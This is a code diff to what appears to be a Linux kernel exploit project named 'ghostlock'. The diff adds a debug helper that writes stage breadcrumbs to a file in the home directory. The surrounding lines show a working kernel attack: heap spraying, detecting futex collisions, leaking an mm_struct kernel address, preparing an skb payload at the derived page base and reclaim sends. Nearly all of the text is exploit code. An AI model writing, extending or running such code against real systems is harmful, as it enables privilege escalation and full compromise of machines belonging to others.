@@ -586,6 +586,22 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
+    void spray_breadcrumb(const char *stage) {
+        std::array < char, 320 > path{};
+        snprintf(path.data(), path.size(), "%s/.ghostlock_spray_probe",
+                 config::runtime_config_snapshot().home_dir.c_str());
+        const int32_t fd = open(path.data(), O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (fd < 0) return;
+        std::array < char, 128 > line{};
+        const int32_t n = snprintf(line.data(), line.size(), "%s\n", stage);
+        if (n > 0) {
+            const ssize_t written = write(fd, line.data(), static_cast<size_t>(n));
+            (void) written;
+        }
+        (void) fsync(fd);
+        close(fd);
+    }
+
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -593,10 +609,12 @@ namespace ghostlock::support {
          * context arrays are replaced. Keeping the final post-spray memfd pinned
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
         park_reclaim_page();
+        spray_breadcrumb("step1 park_reclaim_page");
         cleanup_page_prepare_state();
         mm_objs_per_slab = kernel::ORDER3_SIZE /
                            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
         prepare_ctxs();
+        spray_breadcrumb("step2 prepare_ctxs");
 
         session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
         memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);
@@ -651,6 +669,7 @@ namespace ghostlock::support {
         }
         pr_info("[spray] finding futex collisions... +%lldms\n",
                 ms_since(&t_spray));
+        spray_breadcrumb("step2b children-killed");
         {
             struct timespec t_wait;
             clock_gettime(CLOCK_MONOTONIC, &t_wait);
@@ -699,6 +718,7 @@ namespace ghostlock::support {
             }
         }
         if (!snitch.has_collisions()) {
+            spray_breadcrumb("step3 no-collisions");
             pr_warning("[spray] futex collisions not found\n");
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -711,6 +731,7 @@ namespace ghostlock::support {
         pr_info("[spray] futex collisions found +%lldms\n",
                 ms_since(&t_spray));
         (void) snitch.scan();
+        spray_breadcrumb("step4 mm-leak-scan");
         pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                 snitch.result(), ms_since(&t_spray));
         uintptr_t leaked = snitch.result();
@@ -732,6 +753,7 @@ namespace ghostlock::support {
 
         uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
         if (!prepare_skb_payload(base, request)) {
+            spray_breadcrumb("step5 skb-payload-fail");
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -805,6 +827,7 @@ namespace ghostlock::support {
             kill_child(prepare_ctx.childs[i]);
         }
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
+            spray_breadcrumb("step6 reclaim-sends");
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
             if (sent <= 0) {
@@ -812,6 +835,7 @@ namespace ghostlock::support {
             }
         }
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
+        spray_breadcrumb("step7 spray-done");
         snitch.reset();
 
         return base;
